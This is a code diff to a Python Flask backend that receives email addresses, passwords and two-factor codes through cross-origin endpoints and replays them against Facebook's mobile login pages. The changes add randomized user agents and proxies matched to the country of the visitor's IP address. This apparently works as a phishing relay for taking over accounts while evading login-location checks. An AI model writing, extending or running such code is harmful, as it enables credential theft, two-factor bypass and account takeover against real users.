@@ -6,20 +6,27 @@ from bs4 import BeautifulSoup
 from flask import Flask, request, render_template, jsonify
 from flask_cors import CORS, cross_origin
 from config import CONFIG
+from fake_useragent import UserAgent
+ua = UserAgent()
 
 app = Flask(__name__)
 CORS(app, support_credentials=True)
 
 
 class Facebook:
-    def __init__(self) -> None:
-        self.proxy = self.get_proxy()
+    def __init__(self, ua, proxy_country=False) -> None:
+        # self.proxy = self.get_proxy()
+        self.user_agent = ua.random
+        self.proxy_country = proxy_country
 
     def get_proxy(self):
         with open(CONFIG.PROXY_PATH, 'r') as f:
             proxies = f.readlines()
-
-        proxy = random.choice(proxies).strip()
+        if self.proxy_country == False:
+            proxy = random.choice(proxies).strip()
+        else:
+            proxy = random.choice(
+                [x for x in proxies if self.proxy_country in x]).strip()
 
         ip, port, username, password, country = proxy.split(':')
 
@@ -27,15 +34,6 @@ class Facebook:
             'http': f'http://{username}:{password}@{ip}:{port}',
             'https': f'http://{username}:{password}@{ip}:{port}'
         }
-
-        # print(proxy)
-
-        # test proxy
-        # url = 'https://ipconfig.io/json'
-
-        # rq = requests.get(url, proxies=proxy)
-
-        # print(rq.text)
 
         return proxy
 
@@ -64,6 +62,18 @@ class Facebook:
         print(jazoest, lsd, cookie)
 
         return jazoest, lsd, cookie
+
+    def check_ip_country(self, ip: str):
+        try:
+            url = f'https://api.country.is/{ip}'
+            rq = requests.get(url)
+            if rq.status_code == 200:
+                country = rq.json()['country']
+                return country
+            else:
+                return False
+        except:
+            return False
 
     def check_valid_account(self, email: str):
         url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'
@@ -139,7 +149,9 @@ class Facebook:
         return jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
 
     def check_password(self, user: str, password: str, ip: str):
-        print(ip)
+        self.proxy_country = self.check_ip_country(ip)
+        proxy = self.get_proxy()
+        print(proxy)
         url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 
         jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie = self.get_data_password()
@@ -416,7 +428,7 @@ class Facebook:
 def check_email():
     data = request.get_json()
     email = data.get('email')
-    fb = Facebook()
+    fb = Facebook(ua)
     global is_login_successful
     is_login_successful = 0
     try:
@@ -446,7 +458,7 @@ def check_password():
     data = request.get_json()
     email = data.get('email')
     password = data.get('password')
-    fb = Facebook()
+    fb = Facebook(ua)
     try:
         is_login_successful = fb.check_password(email, password, ip)
     except:
@@ -471,12 +483,19 @@ def check_password():
 @cross_origin(supports_credentials=True)
 def check_towfa():
     global jazoest, lsd, li, m_ts, try_number, unrecognized_tries, cookie
+    ip = request.remote_addr
     data = request.get_json()
     email = data.get('email')
     password = data.get('password')
     fa_key = data.get('towfa')
 
-    fb = Facebook()
+    fb = Facebook(ua)
+
+    # proxy
+    fb.proxy_country = fb.check_ip_country(ip)
+    proxy = fb.get_proxy()
+    print(proxy)
+
     # is_login_successful = fb.login_get_cookies(password, email, towfa)
 
     url = 'https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
